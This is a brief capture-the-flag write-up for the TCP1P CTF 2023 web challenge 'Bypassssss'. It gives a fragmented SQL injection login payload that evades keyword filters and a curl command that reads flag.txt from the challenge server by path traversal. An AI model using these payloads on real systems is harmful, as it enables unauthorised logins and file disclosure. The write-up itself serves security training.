# bypassssss

I used to have a website but unfortunately my website always gets hacked :(. 
But now I'm pretty sure they won't break into my website, right? right?!?!

## Solution

https://github.com/TCP1P/TCP1P-CTF-2023-Challenges/tree/main/Web/Bypassssss/writeup

fragmented sqli attack to login as admin:

user: `\`, password: `oorr/**trtrueue#`

ref: https://www.invicti.com/blog/web-security/fragmented-sql-injection-attacks/

Then local file inclusion:

```sh
curl http://ctf.tcp1p.com:45679/viewer.php?image=...//...//...//...//...//flag.txt
```
